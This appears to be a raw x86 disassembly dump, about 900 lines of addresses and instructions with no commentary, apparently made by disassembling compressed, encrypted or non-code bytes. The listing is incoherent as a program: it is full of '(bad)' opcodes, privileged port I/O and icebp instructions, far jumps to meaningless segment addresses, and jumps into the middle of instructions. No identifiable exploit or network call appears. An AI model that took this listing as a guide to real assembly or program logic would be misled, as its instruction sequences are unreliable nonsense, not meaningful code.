  40b2c4:	pop    ds
  40b2c5:	jmp    0x7207:0x556a0008
  40b2cc:	aad    0xbb
  40b2ce:	je     0x40b283
  40b2d0:	mov    bh,0x4e
  40b2d2:	fiadd  WORD PTR [edx]
  40b2d4:	cdq    
  40b2d5:	mov    dl,0xf2
  40b2d7:	add    DWORD PTR [edi],ecx
  40b2d9:	lods   al,BYTE PTR ds:[esi]
  40b2da:	and    ch,BYTE PTR [esi]
  40b2dc:	sbb    ah,BYTE PTR [eax+0x7529eb07]
  40b2e2:	icebp  
  40b2e3:	pop    edi
  40b2e4:	sub    BYTE PTR ds:0x4400b4dc,dh
  40b2ea:	jecxz  0x40b2e9
  40b2ec:	jmp    DWORD PTR [eax+0x8006ac8]
  40b2f2:	cmp    DWORD PTR [eax-0xc],ebp
  40b2f5:	cmp    BYTE PTR [esi+0x0],al
  40b2f8:	inc    ebp
  40b2fa:	cdq    
  40b2fb:	cld    
  40b2fc:	(bad)  
  40b2fd:	jg     0x40b2bc
  40b2ff:	mov    al,0x6c
  40b301:	enter  0x5008,0x68
  40b305:	fldenv [ebp+0x41]
  40b308:	add    BYTE PTR [eax],al
  40b30a:	outs   dx,DWORD PTR ds:[esi]
  40b30b:	call   0xa1e6:0xe3fffeb2
  40b312:	in     al,dx
  40b313:	or     BYTE PTR [eax],al
  40b315:	pop    edx
  40b316:	rcr    edi,0xbe
  40b319:	jne    0x40b2bb
  40b31b:	(bad)  
  40b31d:	jne    0x40b2b3
  40b31f:	ffreep st(7)
  40b321:	je     0x40b391
  40b323:	inc    eax
  40b324:	scas   al,BYTE PTR es:[edi]
  40b325:	dec    eax
  40b326:	(bad)  [eax]
  40b328:	push   DWORD PTR [ebp+0x64]
  40b32b:	shr    BYTE PTR [edi-0x21c807d],0xb5
  40b332:	xor    al,0xe3
  40b334:	std    
  40b335:	dec    eax
  40b337:	shl    bh,0x83
  40b33a:	dec    edi
  40b33b:	jecxz  0x40b38b
  40b33d:	inc    DWORD PTR ds:0x4c75fef5
  40b343:	cmp    bh,bh
  40b345:	jne    0x40b397
  40b347:	shl    BYTE PTR [esi-0x6],0x6f
  40b34b:	jecxz  0x40b333
  40b34d:	icebp  
  40b34e:	jmp    ebx
  40b350:	std    
  40b351:	(bad)  
  40b352:	vpaddb xmm7,xmm6,xmm7
  40b356:	fbstp  TBYTE PTR [edi]
  40b358:	push   DWORD PTR [ebp-0x21974]
  40b35e:	rcl    BYTE PTR [eax+0x6b],0x0
  40b362:	xor    edx,esi
  40b364:	jg     0x40b325
  40b366:	ds gs and dh,bh
  40b36a:	push   es
  40b36b:	and    ebp,0xffffffb4
  40b36e:	add    BYTE PTR [ebp+0x9fee65b],bh
  40b374:	add    bl,BYTE PTR [ebx+0x0]
  40b377:	xor    DWORD PTR [ebx-0x50],ebp
  40b37a:	mov    bh,0xe7
  40b37c:	(bad)  
  40b37d:	out    0xe7,al
  40b37f:	lock mov edx,0x2fe8fee5
  40b385:	adc    eax,DWORD PTR [eax]
  40b387:	xlat   BYTE PTR fs:[bx]
  40b38a:	(bad)  
  40b38b:	cmp    al,0xd6
  40b38d:	in     eax,0x74
  40b38f:	and    DWORD PTR [ebx],ebx
  40b391:	jo     0x40b39f
  40b393:	mov    dh,0x9c
  40b395:	cli    
  40b396:	out    0x24,eax
  40b398:	sub    eax,0x2f78fee6
  40b39d:	idiv   edi
  40b39f:	add    eax,0x6d82d757
  40b3a4:	add    DWORD PTR [esi-0x1],ecx
  40b3a7:	add    al,0xbe
  40b3a9:	fidivr DWORD PTR [edx+0xae602ad]
  40b3af:	jno    0x40b405
  40b3b1:	add    BYTE PTR [edi+0x68],bl
  40b3b4:	das    
  40b3b5:	idiv   edi
  40b3b7:	outs   dx,DWORD PTR ds:[esi]
  40b3b8:	push   esp
  40b3b9:	adc    ebp,eax
  40b3bb:	fwait
  40b3bc:	ins    DWORD PTR es:[edi],dx
  40b3bd:	in     eax,0xfe
  40b3bf:	sub    dh,BYTE PTR [edx-0x5709fa92]
  40b3c5:	ror    DWORD PTR [ebx],0x31
  40b3c8:	retf   
  40b3c9:	outs   dx,BYTE PTR ds:[esi]
  40b3ca:	or     al,0x59
  40b3cc:	lods   eax,DWORD PTR ds:[esi]
  40b3cd:	jns    0x40b3cd
  40b3cf:	ds (bad) 
  40b3d1:	ret    0x74
  40b3d4:	es dec edx
  40b3d6:	xchg   esi,eax
  40b3d7:	inc    edi
  40b3d8:	jo     0x40b3ca
  40b3da:	jecxz  0x40b450
  40b3dc:	xor    eax,0xb2029109
  40b3e1:	ficomp DWORD PTR [ebp-0x1690d727]
  40b3e7:	in     al,0x85
  40b3e9:	or     eax,0xdab0ee81
  40b3ee:	test   DWORD PTR [ebx+0x75],edi
  40b3f1:	aad    0x10
  40b3f3:	mov    ds:0xe4e94856,eax
  40b3f8:	gs aad 0x80
  40b3fb:	fidiv  WORD PTR [eax+0x757b65da]
  40b401:	loope  0x40b3d3
  40b403:	(bad)  
  40b405:	or     ecx,ebp
  40b407:	(bad)  [ecx+0x5a]
  40b40a:	dec    esi
  40b40b:	in     eax,0xb9
  40b40d:	inc    esp
  40b40e:	inc    ebp
  40b40f:	pop    esp
  40b410:	xor    ecx,edi
  40b412:	call   0xb6867d1a
  40b417:	in     al,0xaf
  40b419:	nop
  40b41a:	mov    ds:0x2154a7f3,eax
  40b41f:	fcomp  QWORD PTR [edi+0x2be51d86]
  40b425:	leave  
  40b426:	in     eax,0x7f
  40b428:	int    0x9
  40b42a:	jmp    0x1953a32
  40b42f:	pop    esp
  40b430:	mov    esp,ebx
  40b432:	call   0xf5952a3a
  40b437:	fild   DWORD PTR [eax]
  40b439:	lods   al,BYTE PTR ds:[esi]
  40b43a:	outs   dx,DWORD PTR ds:[esi]
  40b43b:	jmp    0xeb226643
  40b440:	hlt    
  40b441:	mov    ah,0xa5
  40b443:	call   0x53cee54b
  40b448:	call   0xf529ce1b
  40b44d:	mov    dl,0x81
  40b44f:	call   0x8fb1e557
  40b454:	arpl   ax,si
  40b456:	or     BYTE PTR [eax],al
  40b458:	push   ds
  40b459:	or     eax,0x32e96b3c
  40b45e:	push   cs
  40b45f:	rcr    BYTE PTR ds:0xa174da8c,0x7a
  40b466:	fimul  DWORD PTR [esi]
  40b468:	jmp    0x99b58e9f
  40b46d:	push   0xffffff99
  40b46f:	inc    edi
  40b470:	sub    BYTE PTR ds:0x7209c171,dh
  40b476:	or     DWORD PTR [edi-0x7f],edx
  40b479:	popa   
  40b47a:	outs   dx,DWORD PTR ds:[esi]
  40b47b:	add    cl,ch
  40b47d:	jmp    0xd602281b
  40b482:	push   esp
  40b483:	clc    
  40b484:	shl    DWORD PTR [ebx],cl
  40b486:	jno    0x40b43e
  40b488:	leave  
  40b489:	jae    0x40b494
  40b48b:	push   edi
  40b48c:	inc    ecx
  40b48d:	inc    ebx
  40b48e:	outs   dx,DWORD PTR ds:[esi]
  40b48f:	add    cl,ch
  40b491:	mov    cl,0xd1
  40b493:	add    BYTE PTR [edi+eax*1-0x6ac68b26],dh
  40b49a:	push   esp
  40b49b:	hlt    
  40b49c:	inc    ecx
  40b49d:	add    BYTE PTR [edi+eax*4-0x2],ah
  40b4a1:	add    cl,BYTE PTR es:[esi+0x599b12cf]
  40b4a8:	cmp    al,dh
  40b4aa:	pop    ds
  40b4ab:	push   es
  40b4ac:	(bad)  
  40b4ad:	jmp    0x40b49d
  40b4af:	inc    esi
  40b4b0:	or     ebx,DWORD PTR [ebx]
  40b4b2:	push   cs
  40b4b3:	add    al,0x80
  40b4b5:	ret    
  40b4b6:	xor    dl,BYTE PTR [esi+ebp*8-0xa]
  40b4ba:	fdiv   st(0),st
  40b4bc:	dec    edi
  40b4bd:	out    dx,al
  40b4be:	aam    0x10
  40b4c0:	call   0xff1b0873
  40b4c5:	rcl    edx,1
  40b4c7:	pop    edx
  40b4c8:	call   esi
  40b4ca:	pop    esi
  40b4cb:	or     edi,edi
  40b4cd:	push   esp
  40b4ce:	cmp    eax,0x780074da
  40b4d3:	in     eax,0x73
  40b4d5:	or     BYTE PTR [eax+0x72],ah
  40b4d8:	cld    
  40b4d9:	jmp    edi
  40b4db:	jmp    0xece27511
  40b4e0:	std    
  40b4e1:	call   edi
  40b4e3:	mov    edi,0xfc0f38ac
  40b4e8:	test   BYTE PTR [eax-0x59],ch
  40b4eb:	in     al,dx
  40b4ec:	std    
  40b4ed:	call   FWORD PTR ds:0x3655e6b1
  40b4f3:	in     al,dx
  40b4f4:	std    
  40b4f5:	(bad)  
  40b4f6:	std    
  40b4f7:	mov    esp,0xebe64de6
  40b4fc:	std    
  40b4fd:	(bad)  
  40b4fe:	fnsave [esi+eiz*8-0x1429ffbb]
  40b505:	std    
  40b506:	(bad)  
  40b507:	std    
  40b508:	mov    eax,0xebe63de6
  40b50d:	std    
  40b50e:	(bad)  
  40b50f:	fstp   st(4)
  40b511:	std    
  40b512:	jne    0x40b4d8
  40b514:	jmp    0x40b589
  40b516:	or     BYTE PTR [eax+0x3f],ah
  40b519:	(bad)  
  40b51a:	jmp    DWORD PTR [edi+0x4c]
  40b51d:	leave  
  40b51e:	ret    0xc84
  40b521:	push   ebp
  40b522:	mov    eax,DWORD PTR [eax+edx*4-0x3e]
  40b526:	call   0xff54e762
  40b52b:	lods   eax,DWORD PTR ds:[esi]
  40b52c:	fsubr  st(6),st
  40b52e:	lea    esi,[edx+0x480b000c]
  40b534:	xor    DWORD PTR [edi+0x6a],edx
  40b537:	mov    BYTE PTR [esi+eax*8+0x60],ah
  40b53b:	cdq    
  40b53c:	or     al,0xff
  40b53e:	jne    0x40b4c8
  40b540:	jmp    0x40b5b5
  40b542:	or     al,0x80
  40b544:	xlat   BYTE PTR ds:[ebx]
  40b545:	jg     0x40b546
  40b547:	ja     0x40b550
  40b549:	shl    BYTE PTR [ecx+esi*1+0x21],0x34
  40b54e:	push   eax
  40b54f:	pop    ecx
  40b550:	lods   al,BYTE PTR ds:[esi]
  40b551:	mov    esi,edi
  40b553:	ds fcmovnb st,st(2)
  40b556:	jae    0x40b558
  40b558:	pop    ecx
  40b559:	dec    eax
  40b55a:	call   0x422b71fa
  40b55f:	mov    bl,0xa6
  40b561:	loope  0x40b56d
  40b563:	icebp  
  40b564:	cmc    
  40b565:	(bad)  
  40b566:	inc    BYTE PTR [eax]
  40b568:	pushf  
  40b569:	or     dh,BYTE PTR [eax+ebp*8]
  40b56c:	loope  0x40b5ce
  40b56e:	loop   0x40b56e
  40b570:	popa   
  40b571:	xchg   DWORD PTR [edi-0x18],edx
  40b574:	popa   
  40b575:	(bad)  
  40b576:	push   edi
  40b577:	or     BYTE PTR [ecx],cl
  40b579:	mov    ebx,0x89eefee0
  40b57e:	int    0x7c
  40b580:	out    0x66,al
  40b582:	loop   0x40b5f8
  40b584:	leave  
  40b585:	cmp    esi,eax
  40b587:	jl     0x40b55f
  40b589:	ss jmp 0x40b549
  40b58c:	dec    esp
  40b58d:	aas    
  40b58e:	loop   0x40b5f7
  40b590:	xor    edx,ebp
  40b592:	add    al,BYTE PTR [eax]
  40b594:	leave  
  40b595:	sbb    ah,BYTE PTR [eax-0x1]
  40b598:	mov    dh,0x58
  40b59a:	dec    eax
  40b59b:	clc    
  40b59c:	mov    esp,0xa64fdea4
  40b5a1:	pushf  
  40b5a2:	repnz (bad) 
  40b5a4:	and    al,0xde
  40b5a6:	jmp    0x710b:0x2e208d3
  40b5ad:	je     0x40b601
  40b5af:	(bad)  
  40b5b0:	in     al,dx
  40b5b1:	icebp  
  40b5b2:	add    al,BYTE PTR [eax]
  40b5b4:	xor    edx,esp
  40b5b6:	leave  
  40b5b7:	inc    esp
  40b5b8:	jge    0x40b590
  40b5ba:	or     BYTE PTR [eax],al
  40b5bc:	xor    DWORD PTR [edx+eax*1+0x28c316a],ecx
  40b5c3:	push   0x31
  40b5c5:	or     DWORD PTR [edi+eax*2+0x5d],esi
  40b5c9:	cmp    dh,bl
  40b5cb:	push   edi
  40b5cc:	add    BYTE PTR [ecx-0x29],cl
  40b5cf:	pop    ebx
  40b5d0:	aam    0x47
  40b5d2:	pop    ebp
  40b5d3:	int    0xec
  40b5d5:	mov    WORD PTR [ecx-0x17],fs
  40b5d8:	add    ebp,DWORD PTR [edx]
  40b5da:	leave  
  40b5db:	xor    al,0x6
  40b5dd:	sbb    dl,BYTE PTR [ecx+eax*2]
  40b5e0:	mov    dl,0x6e
  40b5e2:	dec    eax
  40b5e3:	jmp    0x913a5bc8
  40b5e8:	push   es
  40b5e9:	mov    al,0xd6
  40b5eb:	popf   
  40b5ec:	loope  0x40b573
  40b5ee:	sar    DWORD PTR [eax],1
  40b5f0:	in     al,dx
  40b5f1:	jne    0x40b57b
  40b5f3:	(bad)  
  40b5f4:	loope  0x40b59f
  40b5f6:	dec    esp
  40b5f7:	xchg   ebp,eax
  40b5f8:	loope  0x40b677
  40b5fa:	icebp  
  40b5fb:	jge    0x40b654
  40b5fd:	inc    ebp
  40b5fe:	(bad)  
  40b5ff:	sti    
  40b600:	out    dx,eax
  40b601:	out    0x5c,eax
  40b603:	fucom  st(0)
  40b605:	add    DWORD PTR gs:[ecx-0x5],edx
  40b609:	xlat   BYTE PTR ds:[ebx]
  40b60a:	(bad)  
  40b60b:	pop    ebp
  40b60c:	loope  0x40b653
  40b60e:	in     eax,0x40
  40b610:	sbb    eax,0xe14dd644
  40b615:	jne    0x40b5f0
  40b617:	push   ecx
  40b618:	xor    DWORD PTR [edi+0x8ec3d5c],0xa603e960
  40b622:	pop    esp
  40b623:	xor    esp,ebp
  40b625:	push   esp
  40b626:	push   esp
  40b627:	es loope 0x40b693
  40b62a:	retf   
  40b62b:	hlt    
  40b62c:	add    esp,esp
  40b62e:	add    DWORD PTR [ebx+eax*4],0xedd7200
  40b635:	loope  0x40b6b6
  40b637:	arpl   cx,bp
  40b639:	ins    DWORD PTR es:[edi],dx
  40b63a:	dec    ebp
  40b63b:	(bad)  
  40b63c:	jae    0x40b649
  40b63e:	pop    ecx
  40b63f:	dec    esp
  40b640:	add    BYTE PTR [ebx+0x51],dh
  40b643:	xlat   BYTE PTR ds:[ebx]
  40b644:	mov    BYTE PTR [esi+edi*2-0x2d7ffb31],ah
  40b64b:	inc    edi
  40b64c:	add    cl,ch
  40b64e:	xor    cl,BYTE PTR [ecx]
  40b650:	add    BYTE PTR [edi+ebp*4-0x21],ah
  40b654:	std    
  40b655:	into   
  40b656:	push   ecx
  40b657:	inc    esi
  40b658:	push   0x933ed
  40b65d:	shl    ecx,1
  40b65f:	ins    DWORD PTR es:[edi],dx
  40b660:	add    cl,ch
  40b662:	call   0x6061:0x35286161
  40b669:	or     BYTE PTR [edx+0x9],dh
  40b66c:	push   0x489223
  40b671:	xchg   esi,eax
  40b672:	pop    ds
  40b673:	mov    ebx,0xd6352847
  40b678:	je     0x40b66b
  40b67a:	or     ch,BYTE PTR [esi+0x6dd17efd]
  40b680:	push   0x68097208
  40b685:	or     DWORD PTR [edx+0x48],edx
  40b688:	add    cl,dl
  40b68a:	je     0x40b6f4
  40b68c:	inc    ecx
  40b68d:	jmp    0xe940c1ec
  40b692:	mov    dl,0xd6
  40b694:	je     0x40b677
  40b696:	add    dl,cl
  40b698:	cmp    ebp,0x8484d146
  40b69e:	ss nop
  40b6a0:	(bad)  
  40b6a1:	(bad)  
  40b6a2:	cdq    
  40b6a3:	call   0x74d6:0x32e9683d
  40b6aa:	and    eax,0x11085c91
  40b6af:	(bad)  
  40b6b0:	dec    edi
  40b6b1:	call   DWORD PTR [esi]
  40b6b3:	jnp    0x40b67c
  40b6b5:	add    ebp,ecx
  40b6b7:	inc    edi
  40b6b8:	sub    bl,0x0
  40b6bb:	or     esi,ecx
  40b6bd:	repnz (bad) 
  40b6bf:	outs   dx,DWORD PTR ds:[esi]
  40b6c0:	mov    ch,0x68
  40b6c2:	add    BYTE PTR [edx+0x5075ff2e],dh
  40b6c8:	loope  0x40b686
  40b6ca:	jns    0x40b71b
  40b6cc:	mov    ch,0x87
  40b6ce:	inc    ebp
  40b6cf:	ins    BYTE PTR es:[edi],dx
  40b6d0:	bound  ebx,QWORD PTR [edx]
  40b6d2:	call   0x3e435b
  40b6d7:	push   ebx
  40b6d8:	leave  
  40b6d9:	jb     0x40b6ff
  40b6db:	loopne 0x40b741
  40b6dd:	popa   
  40b6de:	inc    ecx
  40b6df:	sbb    BYTE PTR [ecx],bl
  40b6e1:	call   0xfdf54f46
  40b6e6:	push   eax
  40b6e7:	jo     0x40b6f6
  40b6e9:	adc    bh,ch
  40b6eb:	mov    fs,WORD PTR [ebp-0x54]
  40b6ee:	popa   
  40b6ef:	pop    ecx
  40b6f0:	or     eax,0x525ff50
  40b6f5:	call   0xfdf52c45
  40b6fa:	call   0xffa9caff
  40b6ff:	call   DWORD PTR [edi+0x19609902]
  40b705:	or     eax,0x8c80001
  40b70a:	lea    eax,[ebp-0x24c89]
  40b710:	mov    BYTE PTR [eax+0x4],ah
  40b713:	add    eax,ebx
  40b715:	or     al,ch
  40b717:	stc    
  40b718:	test   DWORD PTR [eax],0x6de06800
  40b71e:	inc    ecx
  40b71f:	add    BYTE PTR [eax-0x67be9e98],al
  40b725:	pusha  
  40b726:	jp     0x40b789
  40b728:	leave  
  40b729:	or     bh,bh
  40b72b:	xor    eax,0x41455a
  40b730:	das    
  40b731:	xor    cl,BYTE PTR [eax]
  40b733:	call   0xff21a769
  40b738:	jle    0x40b6c4
  40b73a:	push   0x61
  40b73c:	lock loope 0x40b7a9
  40b73f:	pusha  
  40b740:	shl    BYTE PTR [eax-0x7f1497fe],1
  40b746:	inc    ebx
  40b747:	add    cl,cl
  40b749:	fild   WORD PTR [edx]
  40b74b:	add    BYTE PTR [ecx+0x590857eb],dh
  40b751:	pushf  
  40b752:	(bad)  
  40b754:	inc    esi
  40b755:	ins    DWORD PTR es:[edi],dx
  40b756:	mov    dh,dh
  40b758:	aas    
  40b759:	ret    
  40b75a:	fisttp QWORD PTR [edi+0x49]
  40b75d:	and    BYTE PTR [ebp+0x0],0x0
  40b761:	xor    DWORD PTR [ebx+0x1526fc57],edx
  40b767:	or     al,0xe8
  40b769:	xchg   esi,eax
  40b76a:	sbb    edi,ebx
  40b76c:	(bad)  
  40b76d:	call   0x6440be11
  40b772:	push   edi
  40b773:	out    dx,eax
  40b774:	sub    ch,0x75
  40b777:	fdiv   st(6),st
  40b779:	inc    BYTE PTR [edi]
  40b77b:	add    al,0x6a
  40b77d:	dec    edi
  40b77e:	mov    edx,DWORD PTR [edi+0x8]
  40b781:	(bad)  
  40b783:	pop    ebx
  40b784:	jmp    esi
  40b786:	push   0xecf6fc48
  40b78b:	jnp    0x40b7ec
  40b78d:	jo     0x40b771
  40b78f:	add    al,BYTE PTR [eax]
  40b791:	xor    edx,esp
  40b793:	pop    DWORD PTR [esi+edi*4+0x61fede3b]
  40b79a:	retf   0x106
  40b79d:	xor    edx,esp
  40b79f:	jmp    0x6e68:0x2e21671
  40b7a6:	rol    BYTE PTR [ebx+0x0],0x9
  40b7aa:	gs fs inc ecx
  40b7ad:	xor    DWORD PTR [ecx],ecx
  40b7af:	xchg   ecx,eax
  40b7b0:	pop    ecx
  40b7b1:	adc    BYTE PTR [edx-0x17],cl
  40b7b4:	fidivr WORD PTR ds:0x3144a0b7
  40b7ba:	aam    0x93
  40b7bc:	or     ecx,DWORD PTR [ecx+0x6fde045f]
  40b7c2:	pusha  
  40b7c3:	es fs add al,dh
  40b7c7:	or     BYTE PTR [ecx-0x16b62e60],al
  40b7cd:	imul   ebx,ebx,0x69
  40b7d0:	sub    BYTE PTR [ecx+ebx*8],al
  40b7d3:	push   es
  40b7d4:	jmp    0x5c1468dc
  40b7d9:	or     al,0x49
  40b7db:	inc    ebx
  40b7dc:	int3   
  40b7dd:	fnsave [edi]
  40b7df:	test   DWORD PTR [ebx-0x2b],ebp
  40b7e2:	sub    al,0xd3
  40b7e4:	mov    ebp,0x4def1934
  40b7e9:	add    al,0x31
  40b7eb:	shl    BYTE PTR [ebx],cl
  40b7ed:	loopne 0x40b806
  40b7ef:	pop    ebp
  40b7f0:	icebp  
  40b7f1:	jmp    0x40b7e1
  40b7f3:	push   ecx
  40b7f4:	sahf   
  40b7f5:	(bad)  
  40b7f7:	(bad)  
  40b7f8:	in     al,dx
  40b7f9:	add    esp,DWORD PTR [esi+edi*2+0x7c]
  40b7fd:	xor    edx,0xffffffdd
  40b800:	xchg   ch,bl
  40b802:	out    dx,eax
  40b803:	pop    edi
  40b804:	jmp    0xfc12c672
  40b809:	or     ecx,ecx
  40b80b:	mov    al,dh
  40b80d:	(bad)  
  40b80f:	sub    BYTE PTR [ebx-0x7ff30821],0x64
  40b816:	jo     0x40b821
  40b818:	jmp    0x5c49e920
  40b81d:	xchg   DWORD PTR [edi-0x122ba2d],edi
  40b823:	pusha  
  40b824:	in     eax,0x2
  40b826:	xor    DWORD PTR [ecx],ecx
  40b828:	add    BYTE PTR [ecx+0x0],al
  40b82b:	mov    BYTE PTR [eax+eax*1-0x17],ch
  40b82f:	or     ch,al
  40b831:	pusha  
  40b832:	test   al,0x32
  40b834:	popa   
  40b835:	fisttp DWORD PTR [eax-0x6c97f70d]
  40b83b:	adc    ecx,DWORD PTR [eax+0x0]
  40b83e:	push   cs
  40b83f:	push   ds
  40b840:	mov    bh,0x47
  40b842:	test   al,0x32
  40b844:	shl    BYTE PTR [ecx+esi*8+0x5a],cl
  40b848:	out    0xfb,al
  40b84a:	idiv   BYTE PTR [ebp+0x6a]
  40b84d:	loope  0x40b7d7
  40b84f:	repz or BYTE PTR [eax-0x3e],ch
  40b853:	rol    DWORD PTR [edi+0x0],cl
  40b856:	push   ecx
  40b857:	jmp    0x40b8c0
  40b859:	inc    ecx
  40b85a:	jmp    0xe940bf29
  40b85f:	mov    dl,0xd3
  40b861:	je     0x40b854
  40b863:	sbb    cl,dl
  40b865:	sti    
  40b866:	mov    esi,0xbe848505
  40b86b:	cld    
  40b86c:	sar    dh,cl
  40b86e:	sbb    DWORD PTR ds:0x32e96576,eax
  40b874:	shl    BYTE PTR [ebp+ebx*4-0x1b],cl
  40b878:	pop    esp
  40b879:	or     BYTE PTR [ecx-0x7100aec5],al
  40b87f:	jmp    0x40b848
  40b881:	add    ebp,ecx
  40b883:	daa    
  40b884:	jle    0x40b871
  40b886:	push   0x76fdd5ee
  40b88b:	std    
  40b88c:	pop    edi
  40b88d:	add    BYTE PTR [ebx],al
  40b88f:	add    BYTE PTR ds:0xdaf174d2,al
  40b895:	iret   
  40b896:	jbe    0x40b8f6
  40b898:	in     eax,0x80
  40b89a:	inc    esp
  40b89b:	push   ebp
  40b89c:	cmc    
  40b89d:	or     al,0x99
  40b89f:	leave  
  40b8a0:	jae    0x40b8ab
  40b8a2:	add    BYTE PTR [eax],al
  40b8a4:	cwde   
  40b8a5:	add    eax,0xbd0d8d00
  40b8aa:	cld    
  40b8ab:	jmp    DWORD PTR [edi+0x16]
  40b8ae:	push   0x58904
  40b8b3:	call   0x412474
  40b8b8:	mov    al,ds:0x88415fae
  40b8bd:	pop    ebp
  40b8be:	icebp  
  40b8bf:	popa   
  40b8c0:	leave  
  40b8c1:	add    eax,0x46b97a68
  40b8c6:	add    bh,bh
  40b8c8:	popf   
  40b8c9:	xchg   edi,eax
  40b8ca:	inc    esi
  40b8cb:	inc    ecx
  40b8cc:	dec    eax
  40b8cd:	mov    ah,0x73
  40b8cf:	or     BYTE PTR [eax],dh
  40b8d1:	adc    edi,esp
  40b8d3:	call   DWORD PTR [edi+0x64]
  40b8d6:	stc    
  40b8d7:	popa   
  40b8d8:	sbb    DWORD PTR ds:0x4be9f168,ecx
  40b8de:	add    BYTE PTR [eax-0x1e],ch
  40b8e1:	imul   eax,DWORD PTR [ecx+0x0],0xffffff80
  40b8e5:	pop    es
  40b8e6:	add    BYTE PTR [eax],al
  40b8e8:	cwde   
  40b8e9:	mov    ah,0x73
  40b8eb:	or     al,dh
  40b8ed:	inc    esi
  40b8ee:	cld    
  40b8ef:	inc    edi
  40b8f1:	add    BYTE PTR [ebx-0x4b29ff09],0xfd
  40b8f8:	push   eax
  40b8f9:	mov    al,ds:0x8006602
  40b8fe:	mov    ah,0x73
  40b900:	cld    
  40b901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b902:	cmp    cl,BYTE PTR [eax]
  40b904:	call   0x3ff5d3
  40b909:	mov    eax,ds:0x3d0002c7
  40b90e:	sub    dl,0x83
  40b911:	mov    WORD PTR [ecx+0x1de20068],?
  40b917:	push   DWORD PTR [ebp-0x40]
  40b91a:	in     al,0x74
  40b91c:	ja     0x40b94f
  40b91e:	aaa    
  40b91f:	fisttp DWORD PTR [eax+0x6e3e6c]
  40b925:	sbb    eax,ebp
  40b927:	fs inc ecx
  40b929:	xor    DWORD PTR [edx-0x1e0f9dfa],edi
  40b92f:	fnstenv [ebx+eax*4]
  40b932:	stos   BYTE PTR es:[edi],al
  40b933:	inc    ebx
  40b934:	add    BYTE PTR [ecx-0x7900a81a],bl
  40b93a:	fcmovnb st,st(2)
  40b93c:	jae    0x40b956
  40b93e:	xchg   edx,eax
  40b93f:	push   0x0
  40b941:	xor    edi,ecx
  40b943:	cwde   
  40b944:	addr16 pop ds
  40b946:	test   BYTE PTR [ebx+0x0],al
  40b949:	add    edi,ecx
  40b94b:	dec    edi
  40b94c:	or     BYTE PTR [ecx-0x28],cl
  40b94f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b950:	(bad)  
  40b951:	push   esi
  40b952:	or     al,BYTE PTR [ebx]
  40b954:	jp     0x40b9a4
  40b956:	out    0x6c,eax
  40b958:	add    BYTE PTR [eax],al
  40b95a:	fld    DWORD PTR [esi+eiz*2]
  40b95d:	inc    ecx
  40b95e:	xor    DWORD PTR [edx+0x8],ecx
  40b961:	(bad)  
  40b962:	lock loope 0x40b93e
  40b965:	xor    al,0x3
  40b967:	sbb    al,BYTE PTR [ebp+0x0]
  40b96a:	sbb    edx,ebx
  40b96c:	push   edi
  40b96d:	call   FWORD PTR [esi]
  40b96f:	jmp    0x40b933
  40b971:	jae    0x40b9ab
  40b973:	repnz imul eax,DWORD PTR [eax],0x31
  40b977:	ja     0x40b911
  40b979:	addr16 push edi
  40b97b:	add    al,0x45
  40b97d:	add    BYTE PTR [ecx+0x77],ah
  40b980:	dec    edi
  40b981:	or     BYTE PTR [ecx],cl
  40b983:	lods   al,BYTE PTR ds:[esi]
  40b984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b985:	(bad)  
  40b986:	out    dx,al
  40b987:	jns    0x40b93e
  40b989:	js     0x40b971
  40b98b:	dec    esi
  40b98c:	fidiv  DWORD PTR [ebp+ebx*8+0x56]
  40b990:	push   eax
  40b991:	or     cl,cl
  40b993:	daa    
  40b994:	push   ebx
  40b995:	dec    esi
  40b997:	or     BYTE PTR [eax],dh
  40b999:	lds    esi,FWORD PTR [edx]
  40b99b:	or     DWORD PTR [esi+ecx*4-0x28d37436],esi
  40b9a2:	pop    esp
  40b9a3:	cmp    bl,al
  40b9a5:	add    ebx,DWORD PTR [ebx]
  40b9a7:	and    eax,DWORD PTR [esi+0x50]
  40b9aa:	cmp    ecx,esp
  40b9ac:	push   eax
  40b9ad:	push   ecx
  40b9ae:	sahf   
  40b9af:	iret   
  40b9b0:	pop    edi
  40b9b1:	inc    eax
  40b9b2:	xchg   ebp,eax
  40b9b3:	(bad)  
  40b9b4:	jmp    0x268e46a4
  40b9b9:	fidivr DWORD PTR [ebx]
  40b9bb:	leave  
  40b9bc:	xchg   esp,eax
  40b9bd:	cld    
  40b9be:	add    dh,ch
  40b9c0:	pusha  
  40b9c1:	jmp    0x80cf3fc9
  40b9c6:	push   ds
  40b9c7:	ror    DWORD PTR [ecx-0x17],cl
  40b9ca:	xor    esp,DWORD PTR [esi+0x55]
  40b9cd:	icebp  
  40b9ce:	jmp    0x40b9ae
  40b9d0:	stos   BYTE PTR es:[edi],al
  40b9d1:	cmc    
  40b9d2:	(bad)  [esi-0x7f]
  40b9d5:	outs   dx,DWORD PTR ds:[esi]
  40b9d6:	fimul  DWORD PTR [edi-0x7d]
  40b9d9:	sbb    esi,DWORD PTR [edx]
  40b9db:	stc    
  40b9dc:	dec    ecx
  40b9dd:	jmp    0x2173b76e
  40b9e2:	inc    ebx
  40b9e3:	xor    DWORD PTR [ecx+0x44a5040d],ecx
  40b9e9:	push   ecx
  40b9ea:	dec    esp
  40b9eb:	xchg   ebx,eax
  40b9ec:	dec    eax
  40b9ed:	jmp    0x4c29c322
  40b9f2:	add    al,0x31
  40b9f4:	add    ch,BYTE PTR [ecx-0x6ec8d1b0]
  40b9fa:	(bad)  
  40b9fc:	into   
  40b9fd:	popf   
  40b9fe:	xor    al,0x89
  40ba00:	or     ecx,ebp
  40ba02:	call   0x66131bbb
  40ba07:	jo     0x40ba12
  40ba09:	sbb    ecx,ebx
  40ba0b:	pop    ebp
  40ba0c:	add    DWORD PTR [ecx-0x316cbd],edx
  40ba12:	jne    0x40b9d9
  40ba14:	inc    eax
  40ba15:	jns    0x40ba85
  40ba17:	call   0xb2efbaff
  40ba1c:	or     al,0x0
  40ba1e:	aam    0xdc
  40ba20:	inc    esp
  40ba21:	cld    
  40ba22:	sbb    al,BYTE PTR [eax]
  40ba24:	in     eax,dx
  40ba25:	xchg   ecx,eax
  40ba26:	dec    BYTE PTR [esi-0x78]
  40ba29:	iret   
  40ba2a:	icebp  
  40ba2b:	xchg   edi,eax
  40ba2c:	inc    ebp
  40ba2d:	push   es
  40ba2e:	jne    0x40b9b2
  40ba30:	js     0x40ba87
  40ba32:	cld    
  40ba33:	ss out 0x0,al
  40ba36:	call   0xff0e9dc2
  40ba3b:	(bad)  
